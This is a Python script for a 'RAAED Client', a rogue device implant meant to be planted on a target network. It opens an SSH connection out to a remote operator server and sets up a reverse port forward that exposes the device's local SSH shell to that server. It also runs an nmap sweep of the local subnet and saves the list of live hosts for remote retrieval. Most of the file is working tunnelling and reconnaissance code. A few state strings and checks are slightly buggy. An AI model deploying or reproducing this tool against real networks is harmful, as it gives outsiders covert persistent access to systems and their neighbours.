#!/usr/bin/env python3

# RAAED Client software
# A GUI RAAED Client
# Establishes a reverse SSH connection bound to port 22 on a remote RAAED Server.
#
# DESCRIPTION
# This RAAED Client script is designed to be installed on a small device which is placed onto a target network.
# The client is to be configured prior to deployment on a target network.
# Once on the target network, the client connects via SSH to the RAAED Server across the network.
# When an SSH connection is established, the client binds its own SSH port to a port on the remote RAAED Server.
#
# SSH REQUIREMENTS
# This script requires an SSH service to be active and running locally.
# /etc/ssh/sshd_config should be configured to allow public key authentication, and operate on port 22.
# a valid private RSA key for the RAAED Server should be placed in ~/.ssh (id_rsa)
# a valid public key with an associated private key on the RAAED Server should be located in ~/.ssh (id_rsa.pub)
#
# THIRD PARTY DEPENDENCIES
# pip3 install paramiko
# pip3 install appjar
# pip3 install netifaces
# pip3 install netaddr
#
# AUTHOR: forScience (james@forscience.xyz)
# 
# INDENT: TABS

import os
import sys
import socket
import select
import threading
import subprocess
import paramiko
import time
import netifaces
import netaddr
from appJar import gui


# save locations for config file and enumerated network list.
# must be absolute path
global conf_file_loc 
conf_file_loc = "/root/Desktop/raaed.conf" # config file save location

global network_list_loc
network_list_loc = "/root/Desktop/network.list" # network list file save location


# Checks raaed.conf (from local directory) for an IP and Port.
# If raaed.conf does not exist one is created.
# The GUI is updated throughout depending on function logic.
# If an IP:Port is present, then connect() is called concurrently (threading)
def read_config():

	global server_host
	global server_port

	# check if config files exists in local dir
	if os.path.exists(conf_file_loc):
		# open and read the config file
		with open(conf_file_loc, 'r') as f:
			
			try: 
				# 0th line is the IP, 1st line is port
				data = f.readlines()
				server_host = data[0].rstrip() # parse IP from raaed.conf
				server_port = int(data[1].rstrip()) # parse Port from raaed.conf

				# success, update GUI
				gui_update('configured')
				
				# we have an IP and Port so try to connect
				# put connection_check() in a thread and daemonised for clean exit
				connectThread = threading.Thread(target=connect, args=())
				connectThread.daemon = True
				connectThread.start()

			except IndexError:
				# must be emtpy file, update GUI
				gui_update('no config')
				return(1)

			except ValueError:
				# must be incorrect input strings
				gui_update('invalid')
				return(1)

	# config file doesnt exist, so create it
	else:
		# create raaed.conf file in local directory
		open(conf_file_loc, 'w')
		# a config cant exsit yet, update GUI
		gui_update('no config')
		return(0)

	return(0) # must have been sucessful


# (GUI) SAVE BUTTON LISTENER
# Updates .conf with iput from GUI.
# If the input fields are empty, then error.
# Wipes current content of raaed.conf file with new user input
# config must exist prior to this function call as raaed_config() is called on launch
def write_config(btn):

	# check if the user input fields are empty
	if app.getEntry('IP') != '' or app.getEntry('Port') != '':
		# open and write to config file
		with open(conf_file_loc, 'w') as f:
			# stored on new lines
			f.write(app.getEntry('IP')) # get IP from input and write to raaed.conf
			f.write("\n") # split IP and Port accross two lines for future parsing
			f.write(app.getEntry('Port')) # get Port from input and write to raaed.conf
		# read newly created configuration and attempt to connect
		read_config()

	else:
		# emtpy input - dont update conf file
		return(1)


# (GUI) RETRY BUTTON LISTENER
# Retry a connection by calling read_config().
# Updates GUI temporarily while retrying (later GUI updated again by read_config())
def retry_connect(btn):

	gui_update('connecting')
	# retry the connection
	read_config()


# Identifies this devices IP address and Subnetmask.
# IP and Subnet mask are then combined in CIDR notation
# the CIDR notation is passed to nmap to do a quick and non-intrusive scan.
# This is parsed into a file in the form of a singular list of IPs.
# The file is made available on the root desktop for later remote retrieval
def begin_enum():

	# GET IP INFORMATION
	# this device interface name
	interface = 'eth0'
	# get interface IP and subnet mask
	address = netifaces.ifaddresses(interface)
	# retrieve interface's IP information
	ipinfo = address[socket.AF_INET][0]
	# get IP and subnet values
	ipaddress = ipinfo['addr']
	subnetmask = ipinfo['netmask']
	# form string to convert into cidr notation
	makecidr = ipaddress + '/' + subnetmask
	# generate IP address/subnet mask in CIDR notation
	cidr = str(netaddr.IPNetwork(makecidr).cidr)

	# use nmap to generate a list file of active IPs on the local network (one per line)
	# generates network.list file in the working directory
	# ('-n' : no dns lookup, '-sn' : no port scan - very quick) 
	nmap = "nmap -n -sn " + cidr + " -oG - | awk '''/Up$/{print $2}''' > " + network_list_loc # build nmap command
	nmapresult = subprocess.call(nmap, shell=True) # execute nmap command


# Handles active reverse connections.
# Called exclusively by reverse_forward_tunnel()).
# Should maintain SSH connection indefinately.
# Local client SSH port will remain bound to server local port 22 (port hard coded in connect()).
def handler(channel, remote_host, remote_port):

	sock = socket.socket()
	try:
		sock.connect((remote_host, remote_port))

	except Exception as e:
		# Tunnel opened, update GUI
		gui_update('failed')
		return (1)
	
	# Tunnel opened, update GUI
	gui_update('tunnel')
	
	# handle bi-directional socket communication
	while True:
		r, w, x = select.select([sock, channel], [], [])
		if sock in r:
			data = sock.recv(1024)
			if len(data) == 0:
				break
			channel.send(data)
		if channel in r:
			data = channel.recv(1024)
			if len(data) == 0:
				break
			sock.send(data)

	# connection has failed, close socket
	channel.close()
	sock.close()

	# Tunnel closed, update GUI
	gui_update('connected')


# Establishes a reverse tunnel back to the RAAED server
# Called exclusively by connect().
# The client SSH port 22 is bound to the server port 22 through existing reverse SSH connection 
# Handler is called to process comms.
def reverse_forward_tunnel(local_host, local_port, transport):

	# forward TCP from local listening port 22
	transport.request_port_forward('', local_port)

	while True:
		# get the channel opened by client
		channel = transport.accept(1000)

		# if tunnel is established, pass to handler() otherwise drop out
		if channel is None:

			continue

		# call handler() to deal with channel
		try:
			# put handler() in a thread and daemonised for clean exit
			handlerThread = threading.Thread(target=handler, args=(channel, local_host, local_port))
			handlerThread.setDaemon(True)
			handlerThread.start()

		except Exception:

			return(1)


# Establishes initial SSH connection to server.
# Once the SSH session is established the reverse tunnelling is conducted.
# Retrieves server values from Globals (server_host, server_port) set in raaed.conf
def connect():

	# hard coded client port and retrive client (this) machines address
	local_host = socket.gethostbyname(socket.gethostname()) # This clients IP Address
	local_port = 22 # This clients SSH listening port
	
	# setup ssh connection parameters and auto-add new host key
	client = paramiko.SSHClient()
	client.load_system_host_keys()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	gui_update('connecting')

	# attempt to connect to server
	try:

		# attempt to connect
		client.connect(server_host, server_port, username='raaedServer', look_for_keys=True, timeout=5)

		gui_update('connected')

	except Exception as e:

		# retry SSH connection (loops until success)
		gui_update('failed')
		time.sleep(5) # wait five seconds before attempting connect
		read_config() # connect again
		return(1)

	# sucessful forwarding to shell so update GUI
	gui_update('forwaring')

	# begin enumeration of local network
	# put in a seperate thread to prevent blocking connection
	connectThread = threading.Thread(target=begin_enum, args=())
	connectThread.daemon = True
	connectThread.start()

	# establish reverse SSH tunnel to server
	try:
		reverse_forward_tunnel(local_host, local_port, client.get_transport())

	except Exception:
		# unsucessful: forwarding failed update GUI
		return(1)

	return(0)


# GUI upodater, called depending on connection and input states
# Takes update state as an argument and adjusts GUI elements accordingly
def gui_update(update):

	if update == 'configured':

		app.setEntry("IP", server_host) # set IP field to .conf file output
		app.setEntry("Port", str(server_port)) # set Port field to .conf file output
		explain_text = "IP Address " + server_host + " and port " + str(server_port) + " configured" # create explanation string
		app.setLabel("explainText", explain_text) # update GUI with explanation string

	elif update == 'no config':

		app.setLabel("indicator", "Disconnected") 
		app.setLabelBg("indicator", "red")
		app.setLabelFg("explainText", "black")
		explain_text = "IP/port not configured" 
		app.setLabel("explainText", explain_text)

	elif update == 'invalid':

		app.setLabel("indicator", "Disconnected")
		app.setLabelBg("indicator", "red")
		app.setLabelFg("explainText", "black")
		explain_text = "Invalid server details"
		app.setLabel("explainText", explain_text)

	elif update == 'connecting':

		app.setLabel("indicator", "Connecting ...")
		app.setLabelBg("indicator", "black")
		app.setLabelFg("explainText", "black")
		explain_text = ("Connecting to server " + server_host + " on port " + str(server_port) + " ...")
		app.setLabel("explainText", explain_text)

	elif update == 'failed':

		app.setLabel("indicator", "Failed")
		app.setLabelBg("indicator", "red")
		explain_text = "Connection failed: Connection to " + server_host + " not established"
		app.setLabelFg("explainText", "red")
		app.setLabel("explainText", explain_text)

	elif update == 'tunnel':

		app.setLabel("indicator", "Tunnelling...")
		app.setLabelBg("indicator", "green")
		explain_text = "Tunnel established: " + server_host + " tunnelling to local SSH"
		app.setLabelFg("explainText", "green")
		app.setLabel("explainText", explain_text)

	elif update == 'connected':

		app.setLabel("indicator", "Connected")
		app.setLabelBg("indicator", "green")
		explain_text = "Connected to " + server_host + " on port " + str(server_port)
		app.setLabelFg("explainText", "green")
		app.setLabel("explainText", explain_text)

	elif update == 'forwarding':

		app.setLabel("indicator", "Forwarding...")
		app.setLabelBg("indicator", "green")
		explain_text = "Forwarding local SSH Port " + str(local_port) + " to " + server_host
		app.setLabelFg("explainText", "green")
		app.setLabel("explainText", explain_text)


# Entry
# GUI in main thread
if __name__ == "__main__":

	# <<<<<<<<<<<<<<<<<<<<<<<<<<<<
	# GUI ELEMENTS
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>
	# create the GUI & set a title
	app = gui("RAAED Client")
	app.setBg("white")
	app.setFont(12, font="Arial")
	app.setSticky("nesw")
	app.setResizable(canResize=False)

	# RAAED SERVER INPUT FIELDS
	# text entry field title
	app.startLabelFrame("Target RAAED Server")
	app.setLabelFramePadding("Target RAAED Server", 4, 8)
	# server IP entry field
	app.addEntry("IP", 0, 0)
	app.setEntryDefault("IP", "IP Address")
	app.setEntryWidth("IP", 30)
	app.setEntryTooltip("IP", "This is your target RAAED Server IP address")
	# server Port entry field
	app.addEntry("Port", 0, 1)
	app.setEntryDefault("Port", "SSH Port")
	app.setEntryWidth("Port", 15)
	app.setEntryTooltip("Port", "This is your target RAAED Server (SSH) port")
	# save button and retry button
	app.addButton("Save", write_config, 0, 2)
	app.addButton("Connect", retry_connect, 0, 3)
	# end top frame
	app.stopLabelFrame()

	# CONNECTION STATUS FIELD
	# display current connection status (to RAAED) and config status
	app.startLabelFrame("Connection Status")
	app.setLabelFramePadding("Connection Status", 4, 8)
	# connection indicator
	app.addLabel("indicator", "Disconnected", 0, 0)
	app.setLabelPadding("indicator", 2, 5)
	app.setLabelBg("indicator", "red")
	app.setLabelFg("indicator", "white")
	# explanation text
	app.addLabel("explainText", "", 0, 1)
	# end bottom frame
	app.stopLabelFrame()

	# retrieve IP from config file
	read_config()

	# Start GUI
	app.go()